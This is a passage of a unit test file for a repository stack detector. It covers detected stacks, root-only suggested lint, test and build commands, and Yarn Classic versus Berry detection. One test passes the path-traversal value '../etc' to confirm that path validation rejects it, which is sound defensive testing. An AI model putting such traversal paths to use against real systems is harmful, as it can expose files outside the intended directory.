      [],
      {},
      { components: 'no' },
      { components: [null] },
    ]) {
      expect(detectedStacks(bad)).toBeNull();
    }
    expect(detectedStacks({ components: [] })).toBeNull();
    expect(detectedStacks({ components: [{ path: '', stacks: ['ruby'] }] })).toBeNull();
  });

  it('is null for a truncated detection: a stack past the truncation is not in it', () => {
    const components = [{ path: '', stacks: ['node'] }];
    expect(detectedStacks({ components })).toEqual(['node']);
    expect(detectedStacks({ components, treeTruncated: true })).toBeNull();
    expect(detectedStacks({ components, componentsTruncated: true })).toBeNull();
  });

  it('ignores a component whose path fails validation but keeps the others', () => {
    expect(
      detectedStacks({
        components: [
          { path: '../etc', stacks: ['go'] },
          { path: 'ok', stacks: ['node'] },
        ],
      })
    ).toEqual(['node']);
    expect(detectedStacks({ components: [{ path: '../etc', stacks: ['go'] }] })).toBeNull();
  });
});

describe('suggestions are root-only', () => {
  const D = (files: string[], opts?: Parameters<typeof detectStack>[1]) => detectStack(files, opts);

  it('gives a repo with no root stack none, whatever its components resolve to', () => {
    expect(D(['backend/pom.xml']).suggestedGateCommands).toEqual({});
    expect(D(['a/go.mod', 'b/pyproject.toml']).suggestedGateCommands).toEqual({});
    expect(D(['README.md']).suggestedGateCommands).toEqual({});
  });

  it('keeps the root’s suggestions exactly, whatever components sit below it', () => {
    expect(
      D(['package.json', 'a/go.mod'], { packageJsonScripts: ['lint', 'test'] })
        .suggestedGateCommands
    ).toEqual({ runLint: 'npm run lint', runTests: 'npm test' });
    expect(D(['pyproject.toml', 'a/go.mod']).suggestedGateCommands).toEqual({
      runLint: 'ruff check',
      runTests: 'python -m pytest',
    });
    expect(D(['requirements.txt']).suggestedGateCommands).toEqual({ runTests: 'python -m pytest' });
    expect(D(['go.mod']).suggestedGateCommands).toEqual({
      runBuild: 'go build ./...',
      runLint: 'go vet ./...',
      runTests: 'go test ./...',
    });
    expect(D(['package.json', 'yarn.lock']).suggestedGateCommands).toEqual({});
  });
});

describe('Yarn flavour from the yarn.lock header', () => {
  const CLASSIC = '# THIS IS AN AUTOGENERATED FILE.\n# yarn lockfile v1\n';
  const BERRY =
    '# This file is generated by running "yarn install".\n\n__metadata:\n  version: 8\n';
  const files = ['package.json', 'yarn.lock'];

  it('reads Classic from `# yarn lockfile v1` and Berry from `__metadata:`', () => {
    const classic = detectStack(files, { yarnLockHead: CLASSIC });
    expect(classic).toMatchObject({ packageManager: 'yarn', yarnFlavor: 'classic' });
    expect(classic.components).toEqual([
      { packageManager: 'yarn', path: '', stacks: ['node'], yarnFlavor: 'classic' },
    ]);
    expect(detectStack(files, { yarnLockHead: BERRY })).toMatchObject({
      packageManager: 'yarn',
      yarnFlavor: 'berry',
    });
  });

  it('leaves the flavour unknown for a header that says neither, or none at all', () => {
    expect(detectStack(files, { yarnLockHead: '# something else\n' }).yarnFlavor).toBeUndefined();
    expect(detectStack(files).yarnFlavor).toBeUndefined();
    expect(detectStack(files, { yarnLockHead: '' }).yarnFlavor).toBeUndefined();
  });

  it('is outranked by a packageManager pin and by .yarnrc.yml', () => {
    expect(
      detectStack(files, {
        packageJson: JSON.stringify({ packageManager: 'yarn@4.1.0' }),
        yarnLockHead: CLASSIC,
      }).yarnFlavor
    ).toBe('berry');
    expect(
      detectStack(files, {
        packageJson: JSON.stringify({ packageManager: 'yarn@1.22.19' }),
        yarnLockHead: BERRY,
      }).yarnFlavor
    ).toBe('classic');
    expect(detectStack([...files, '.yarnrc.yml'], { yarnLockHead: CLASSIC }).yarnFlavor).toBe(
      'berry'
    );
  });

  it('does not apply to a root that is not on yarn', () => {
    expect(
      detectStack(['package.json', 'package-lock.json'], { yarnLockHead: CLASSIC })
    ).not.toHaveProperty('yarnFlavor');
    expect(
      detectStack(['package.json', 'pnpm-lock.yaml'], { yarnLockHead: CLASSIC })
    ).not.toHaveProperty('yarnFlavor');
  });

  it('a Classic root resolves to the Classic gates, without a vulnerability scan', () => {
    expect(detectedGateDefaults(detectStack(files, { yarnLockHead: CLASSIC }))).toEqual({
      runBuild: 'yarn build',
      runLint: 'yarn lint',
      runTests: 'yarn test',
      runTypecheck: 'yarn typecheck',
    });
  });
});
